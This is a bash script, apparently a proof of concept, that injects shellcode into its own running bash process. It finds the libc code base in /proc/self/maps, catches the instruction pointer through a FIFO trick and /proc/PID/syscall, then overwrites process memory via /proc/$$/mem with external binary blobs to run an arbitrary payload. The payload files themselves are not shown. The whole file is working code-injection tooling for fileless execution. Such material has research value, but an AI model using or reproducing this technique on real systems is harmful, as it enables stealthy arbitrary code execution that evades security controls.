#!/bin/bash

maps=$(cat /proc/$$/maps | grep r-xp | head -n1)
base=${maps%%-*}

mkfifo /tmp/z 2>/dev/null
PID=$$
# fork off
(
   sleep 0.1
   # /proc/pid/syscall contains the registers of the process (note: the parent, not the child)
   # since this is happening while the parent is spinning trying to read the FIFO, the program counter will always reliably land in the middle of libc write()
   cat /proc/$PID/syscall > /tmp/regs
   # unhang parent
   :</tmp/z
) &

# begin to write to FIFO. this will hang
:>/tmp/z

regs=$(</tmp/regs)
rip=${regs##* }
echo "RIP: $rip"

# big endian <-> little endian
swaps(){
   fold -w2 | tac | tr -d "\n"
}

seek(){
 dd of=/proc/$$/mem conv=notrunc seek=$(( $1 )) bs=1 status=none
}

inject_rip(){

   dd if=/proc/$$/mem of=/tmp/x bs=1 skip=$((rip)) count=100 status=none
   echo "$1" | sed "s/ffffffffffff/$(echo "$rip" | swaps)/g" | xxd -p -r | seek "0x$base"
   echo -en "48b8$(echo "$base" | swaps)0000ffd0" | xxd -r -p | seek "$rip"
}

inject_rip "$(<obj/malloc.bin)"

# call libc write(), triggering shellcode
:>/

a=$(xxd -p <a | swaps)
# cat /proc/$$/maps
# map=$(grep "rwxp" /proc/$$/maps | head -n1)
# ptr=${map%%-*}
ptr=$(printf "%08x" "$(( 0x$a ))")
# ptr=$(printf "%08x" "$a")
echo "--$ptr"

#
xxd -p -r <obj/payload.bin | seek "0x$ptr" 
echo "a"
#
printf "%08x" "$(( 0x$ptr))"
echo
echo "aaaaaaaaaaaaaaaa"
inject_rip "$(sed "s/aaaaaaaaaaaa/$(printf "%08x" "$(( 0x$ptr))" | swaps)/g" < obj/exec.bin)"
:>/

echo "safely returned to bash"

